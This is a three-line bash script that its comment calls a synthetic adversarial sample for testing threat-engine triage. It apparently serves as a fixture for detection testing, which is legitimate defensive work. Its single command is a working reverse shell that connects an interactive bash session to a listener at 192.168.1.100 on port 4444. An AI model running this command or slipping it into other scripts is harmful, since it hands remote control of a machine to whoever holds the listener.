#!/bin/bash
# Synthetic adversarial sample for threat engine triage testing
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
